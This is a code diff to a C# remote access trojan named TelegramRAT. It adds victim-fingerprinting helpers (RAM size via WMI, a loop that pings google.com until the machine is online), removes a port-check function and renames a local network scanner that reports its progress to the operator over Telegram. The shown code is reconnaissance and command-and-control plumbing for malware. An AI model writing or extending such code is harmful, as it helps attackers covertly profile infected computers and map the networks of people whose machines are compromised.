@@ -135,6 +135,31 @@ namespace TelegramRAT
             catch { return "Unknown"; }
         }
 
+        // Get RAM
+        public static int GetRamAmount()
+        {
+            try
+            {
+                int RamAmount = 0;
+                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher("Select * From Win32_ComputerSystem")
+                )
+                {
+                    foreach (ManagementObject MO in MOS.Get())
+                    {
+                        double Bytes = Convert.ToDouble(MO["TotalPhysicalMemory"]);
+                        RamAmount = (int)(Bytes / 1048576);
+                        break;
+                    }
+                }
+
+                return RamAmount;
+            }
+            catch
+            {
+                return -1;
+            }
+        }
+
         // Get HWID
         public static string GetHWID()
         {
@@ -210,20 +235,6 @@ namespace TelegramRAT
 
         }
 
-        // Check target port
-        private static bool portIsOpen(string target, int port)
-        {
-            TcpClient tcpClient = new TcpClient();
-            try
-            {
-                tcpClient.Connect(target, port);
-                return true;
-            }
-            catch (Exception)
-            {
-                return false;
-            }
-        }
 
         // Get default gateway
         public static IPAddress GetDefaultGateway()
@@ -238,8 +249,34 @@ namespace TelegramRAT
                 .FirstOrDefault();
         }
 
+        // Is connected to internet
+        public static void isConnectedToInternet()
+        {
+            while(true)
+            {
+                Ping ping;
+                PingReply reply;
+                try
+                {
+                    ping = new Ping();
+                    reply = ping.Send("google.com", 600);
+                } catch { continue; }
+                
+
+                if (reply.Status == IPStatus.Success)
+                {
+                    Console.WriteLine("Connected to internet");
+                    break;
+                }
+                else {
+                    Console.WriteLine("Retrying connect to internet...");
+                    continue;
+                }
+            }
+        }
+
         // Scan wlan
-        public static void WlanScanner(int to)
+        public static void NetDiscover(int to)
         {
             telegram.sendText("📡 Scanning local network. From 1 to " + to + " hosts.");
             string gateway = "";
